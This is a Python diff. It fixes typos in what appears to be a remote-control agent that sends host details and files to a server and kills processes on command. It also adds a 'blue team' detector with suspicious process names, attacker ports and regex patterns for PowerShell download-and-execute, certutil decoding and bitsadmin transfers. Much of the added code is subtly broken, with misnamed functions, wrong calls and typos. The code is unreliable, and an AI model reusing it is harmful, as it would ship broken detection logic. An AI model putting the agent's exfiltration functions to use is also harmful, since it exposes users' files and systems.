@@ -1,3 +1,18 @@
+import asyncio
+import base64
+import csv
+import getpass
+import hashlib
+import ipaddress
+import json
+import logging
+import math
+import mimetypes
+import uuid
+from collections import Counter, defaultdict, deque
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field, asdict
+from typing import Any, Callable, Iterable, Mapping, Sequence
 import socket
 import threading
 import time
@@ -221,7 +236,7 @@ class CommunicationHandler:
                     "hostname": platform.node(),
                     "os_version": platform.system() + " " + platform.release(),
                     "cpu_cores": psutil.cpu_count(),
-                    "timestamp": daterime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 }
                 self.send_data(metadata, "handshake")
                 
@@ -355,7 +370,7 @@ class SystemManager:
             disk = psutil.disk_usage('/')
             
             info = {
-                "cpu_percent": cpu_losd,
+                "cpu_percent": cpu_load,
                 "memory_percent": memory.percent,
                 "memory_available_gb": round(memory.available / (1024**3), 2),
                 "disk_total_gb": round(disk.total / (1024**3), 2),
@@ -432,7 +447,7 @@ class SystemManager:
                 self.comm.send_data(file_metadata, "file_transfer")
                 
                 # Send file data in chunks
-                chink_size = 1024 * 1024 # 1MB chunks
+                chunk_size = 1024 * 1024 # 1MB chunks
                 for i in range(0, len(file_data), chunk_size):
                     chunk = file_data[i:i + chunk_size]
                     self.comm.send_data(chunk, "file_transfer")
@@ -568,7 +583,7 @@ class OperationCore:
         elif command_str == "exit":
             self.running = False
             
-        elif command_str = "kill_process":
+        elif command_str == "kill_process":
             pid = int(payload) if isinstance(payload, int) else int(payload.get("pid"))
             try:
                 p = psutil.Process(pid)
@@ -576,3 +591,222 @@ class OperationCore:
                 self.comm.send_data({"status": "success", "pid": pid}, "status")
             except Exception as e:
                 self.comm.send_data({"status": "fail", "reason": str(e)}, "error")
+                
+                
+BLUE_TEAM_VERSION = "1.0.0"
+BLUE_TEAM_MAX_FILE_SIZE = 256 * 1024 * 1024
+BLUE_TEAM_MAX_ENTROPY_SAMPLE = 2 * 1024 * 1024
+BLUE_TEAM_TELEGRAM_CHUNK_SIZE = 3500
+BLUE_TEAM_DEFAULT_RATE_WINDOW = 60.0
+BLUE_TEAM_DEFAULT_RATE_LIMIT = 20
+BLUE_TEAM_DEFAULT_SCAN_WORKERS = max(2, min(8, os.cpu_count() or 2))
+
+BT_SUSPICIOUS_EXTENSIONS = {
+    ".exe", ".dll", ".sys", ".scr", ".com", ".cpl", ".msi", ".msp",
+    ".bat", ".cmd", ".ps1", ".psm1", ".vbs", ".vbe", ".js", ".jse",
+    ".wsf", "..wsh", ".hta", ".jar", ".lnk", ".url", ".iso", ".img",
+    ".chm", ".reg",
+}
+BT_SCRIPT_EXTENSIONS = {
+    ".bat", ".cmd", ".ps1", ".psm1", ".vbs", ".vbe", ".js", ".jse",
+    ".wsf", ".wsh", ".hta", ".py", ".pyw", ".sh", ".bash",
+}
+BT_EXECUTABLE_EXTENSIONS = {
+    ".exe", ".dll", ".sys", ".scr", ".com", ".cpl", ".msi", ".msp",
+}
+BT_ARCHIVE_EXTENSIONS = {
+    ".zip", ".7z", ".rar", ".cab", ".tar", ".gz", ".bz2", ".xz",
+}
+BT_SENSITIVE_PATH_PARTS = {
+    "\\windows\\system32\\", "\\windows\\syswow64\\", "\\programdata\\",
+    "\\appdata\\roaming\\", "\\appdata\\local\\temp\\", "/tmp/",
+    "/var/tmp/", "/dev/shm/",
+}
+BT_SUSPICIOUS_PROCESS_NAMES = {
+    "powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe",
+    "mshta.exe", "rundll32.exe", "regsvr32.exe", "certutil.exe",
+    "bitsadmin.exe", "wmic.exe", "msiexec.exe", "installutil.exe",
+}
+BT_COMMON_SYSTEM_NAMES = {
+    "svchost.exe", "services.exe", "lsass.exe", "wininit.exe",
+    "winlogon.exe", "explorer.exe", "taskhostw.exe", "spoolsv.exe",
+}
+BT_RISKY_PARENT_NAMES = {
+    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
+    "acrord32.exe", "chrome.exe", "msedge.exe", "firefox.exe",
+}
+BT_SUSPICIOUS_NETWORK_PORTS = {
+    4444, 5555, 6667, 1337, 31337, 9001, 9002, 12345, 54321,
+}
+BT_MAGIC_SIGNATURES = (
+    (b"MZ", "pe"),
+    (b"PK\x03\x04", "zip"),
+    (b"\x7fELF", "elf"),
+    (b"\xca\xfe\xba\xbe", "mach"),
+    (b"\xfe\xed\xfa\xce", "mach"),
+    (b"%PDF-", "pdf"),
+    (b"\x89PNG\r\n\x1a\n", "png"),
+    (b"\xff\xd8\xff", "jpeg"),
+    (b"GIF8", "gif"),
+    (b"RIFF", "riff"),
+)
+BT_RISKY_COMMAND_PATTERNS = (
+    re.compile(r'(?:^|[\s"\'])-enc(?:odedcommand)?(?:[\s"\']|$)', re.I),
+    re.compile(r'(?:^|[\s"\'])-w(?:indowstyle)?\s+hidden', re.I),
+    re.compile(r"downloadstring\s*\(", re.I),
+    re.compile(r"invoke-expression", re.I),
+    re.compile(r"iex\s*\(", re.I),
+    re.compile(r"frombase64string", re.I),
+    re.compile(r"certutil(?:\.exe)?\s+-decode", re.I),
+    re.compile(r"bitsadmin(?:\.exe)?\s+/transfer", re.I),
+    re.compile(r"mshta(?:\.exe)?\s+https?://", re.I),
+)
+BT_SCORE_WEIGHTS = {
+    "known_bad_hash": 100,
+    "suspicious_path": 20,
+    "double_extension": 30,
+    "script_extension": 8,
+    "executable_extension": 8,
+    "high_entropy": 18,
+    "extension_mismatch": 35,
+    "hidden_file": 6,
+    "suspicious_port": 25,
+    "risky_parent": 20,
+    "risky_command": 25,
+    "rare_process": 10,
+    "new_persistence": 35,
+}
+
+def _bt_now() -> str:
+    return datetime.now().astimezone().infoformat(timespace="seconds")
+    
+def _bt_text(value: Any, limit: int = 2048) -> str:
+    if value is None:
+        return ""
+    try:
+        value = str(value).replace("\x00", "")
+    except Exception:
+        value = repr(value)
+    return value[:limit] if len(value) <= limit else value[:limit - 3] + "..."
+    
+def _bt_path(path: str | os.PathLike[str]) -> str:
+    return os.path.normcase(os.path.abspath(os.fspath(path)))
+    
+def _bt_windows() -> bool:
+    return platform.system().lower()
+    
+def _bt_private(ip: str) -> bool:
+    try:
+        addr = ipaddress.ip_address(ip)
+        return addr.is_private or addr.is_loopback or addr.is_link_local
+    except ValueError:
+        return False
+        
+def _bt_public(ip: str) -> bool:
+    try:
+        addr = ipadsress.ip_address(ip)
+        return not (
+            addr.is_private or addr.is_loopback or addr.is_link_local
+            or addr.is_reserved or addr.is_multicast
+        )
+    except ValueError:
+        return False
+        
+def _bt_entropy(data: bytes) -> float:
+    if not data:
+        return 0.0
+    counts = Counter(data)
+    length = len(data)
+    return round(
+        -sum((c / length) * math.log2(c / length) for c in counts.values()),
+        4,
+    )
+    
+def _bt_magic(data: bytes) -> str:
+    for signature, name in BT_MAGIC_SIGNATURES:
+        if data.startswith(signature):
+            return name
+    return "unknown"
+    
+def _bt_ext(path: str) -> str:
+    try:
+        return pathlib.Path(path).suffix.lower()
+    except Exception:
+        return ""
+        
+def _bt_hidden(path: str) -> bool:
+    try:
+        name = os.path.basename(path)
+        if name.startswith(".") and name not in {".", ".."}:
+            return True
+        if _bt_windows():
+            attrs = os.startswith(path, follow_symlinks=False).st_file_attributes
+            return bool(attrs & 0x2)
+    except Exception:
+        pass
+    return False
+    
+def _bt_double_extension(name: str) -> bool:
+    parts = pathlib.PurePath(name).name.lower().split(".")
+    if len(parts) < 3:
+        return False
+    return (
+        "." + parts[-1] in BT_SUSPICIOUS_EXTENSIONS
+        and "." + parts[-2] in {
+            ".pdf", ".doc", ".docx", ".xls", ".xlsx",
+            ".jpg", ".jpeg", ".png", ".txt", ".rtf",
+        }
+    )
+    
+def _bt_risky_patterns(command: str) -> list[str]:
+    return [pattern.pattern for pattern in BT_RISKY_COMMAND_PATTERNS if pattern.search(command or "")]
+    
+def _bt_chunks(text: str, size: int = BLUE_TEAM_TELEGRAM_CHUNK_SIZE) -> list[str]:
+    text = text or ""
+    if len(text) <= size:
+        return [text]
+    chunks: list[str] = []
+    for start in range(0, len(text), size):
+        chunks.append(text[start:start + size])
+    return chunks
+    
+def _bt_json_default(value: Any) -> Any:
+    if isinstance(value, datetime):
+        return value.isoformat()
+    if isinstance(value, pathlib.Path):
+        return sorted(value)
+    if isinstance(value, bytes):
+        return base64.b64encode(value).decode()
+    return _bt_text(value)
+    
+def _bt_json(value: Any, pretty: bool = False) -> str:
+    return json.dumps(
+        value, ensure_ascii=False, sort_keys=True,
+        indent=2 if pretty else None,
+        separators=None if pretty else (",", ":"),
+        default=_bt_json_default,
+    )
+    
+def _bt_load(path: str, default: Any) -> Any:
+    try:
+        with open(path, "r", encoding="utf-8") as handle:
+            return json.load(handle)
+    except (OSError, json.JSONDecodeError):
+        return default
+        
+def _bt_atomic_write(path: str, value: Any) -> None:
+    directory = os.path.dirname(_bt_path(path)) or "."
+    os.makedirs(directory, exist_ok=True)
+    fd, temp_name = tempfile.mkstemp(prefix=".bt-", suffix=".tmp", dir=directory)
+    try:
+        with os.fopen(fd, "w", encoding="utf-8") as handle:
+            handle.write(_bt_json(value, pretty=True))
+            handle.write("\n")
+            handle.flush()
+            os.fsync(handle.fileno())
+        os.replace(temp_name, path)
+    finally:
+        try:
+            os.unlink(temp_name)
+        except FileNotFoundError:
+            pass
